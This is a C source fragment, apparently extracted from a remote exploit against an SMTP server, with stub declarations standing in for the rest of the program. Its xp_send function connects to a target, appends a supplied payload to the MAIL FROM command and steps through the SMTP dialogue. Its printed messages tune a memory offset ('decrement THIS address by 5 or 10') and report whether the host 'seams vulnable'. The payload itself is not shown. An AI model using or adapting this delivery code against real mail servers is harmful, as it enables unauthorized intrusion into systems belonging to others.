
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct timeval {int tv_sec; scalar_t__ tv_usec; } ;
typedef int fd_set ;
typedef int buffer ;


 int BUFSIZ ;
 char* DATA ;
 char* END ;
 int EXIT_FAILURE ;
 int EXIT_SUCCESS ;
 scalar_t__ FD_ISSET (int,int *) ;
 int FD_SET (int,int *) ;
 int FD_ZERO (int *) ;
 char* FROM ;
 char* HELO ;
 int OPT_CHECK ;
 char* QUIT ;
 char* RCPT ;
 int close (int) ;
 int connect_host (char*,int) ;
 int exit (int ) ;
 int fprintf (int ,char*,...) ;
 int memset (char*,int,int) ;
 int opt_flags ;
 int recv (int,char*,int,int ) ;
 int select (int,int *,int *,int *,struct timeval*) ;
 int send (int,char*,int ,int ) ;
 int sleep (int) ;
 int stderr ;
 int stdout ;
 int strlen (char*) ;

int xp_send (char *host, int port, char *payload) {
 int thesock;
 char buffer[BUFSIZ];
 struct timeval tv;
 fd_set rfds, wfds;
 int ret;

 thesock = connect_host (host, port);
 if (thesock == -1) {
  fprintf (stderr, "[-] Can't connect to target %s\n", host);
  exit (EXIT_FAILURE);
 } else {
  fprintf (stdout, "[+] Connected.\n");
 }

 memset (buffer, 0x00, BUFSIZ);






 memset (buffer, 0x00, BUFSIZ);
 ret = recv (thesock, buffer, sizeof (buffer), 0);




 memset (buffer, 0x00, BUFSIZ);
        ret = send (thesock, HELO, strlen(HELO), 0);
        ret = recv (thesock, buffer, sizeof (buffer), 0);




 memset (buffer, 0x00, BUFSIZ);
 ret = send (thesock, FROM, strlen (FROM), 0);
        ret = send (thesock, payload, strlen (payload), 0);
        ret = recv (thesock, buffer, sizeof (buffer), 0);





 memset (buffer, 0x00, BUFSIZ);
 ret = send (thesock, RCPT, strlen (RCPT), 0);
        ret = recv (thesock, buffer, sizeof (buffer), 0);


 FD_ZERO(&rfds);
 FD_SET(thesock, &rfds);
 tv.tv_sec = 7;
 tv.tv_usec = 0;



 memset (buffer, 0x00, BUFSIZ);
 ret = send (thesock, DATA, strlen (DATA), 0);
 select (thesock+1, &rfds, ((void*)0), ((void*)0), &tv);
 if (FD_ISSET(thesock, &rfds)) {
         ret = recv (thesock, buffer, sizeof (buffer), 0);

 } else {
  close (thesock);
  return -1;
 }

 FD_ZERO(&rfds);
 FD_SET(thesock, &rfds);
 tv.tv_sec = 7;
 tv.tv_usec = 0;



 memset (buffer, 0x00, BUFSIZ);
 ret = send (thesock, END, strlen (END), 0);
 select (thesock+1, &rfds, ((void*)0), ((void*)0), &tv);
 if (!FD_ISSET(thesock, &rfds)) {
  fprintf (stdout, "[+] Offset seems good ! if the next hit fails\n");
  fprintf (stdout, "[+] try to decrement THIS adddress by 5 or 10!\n");
  close (thesock);
  return -1;
 }
        ret = recv (thesock, buffer, sizeof (buffer), 0);
 if (opt_flags & OPT_CHECK) {
  if (buffer[0] == 0x00) {
   fprintf (stdout, "[+] Host seams vulnable!\n");
  } else {
   fprintf (stdout, "[-] Host is not vulnable!\n");
  }
  close (thesock);
  exit (EXIT_SUCCESS);
 }

        ret = send (thesock, QUIT, strlen (QUIT), 0);

 close (thesock);
 return ret;
}
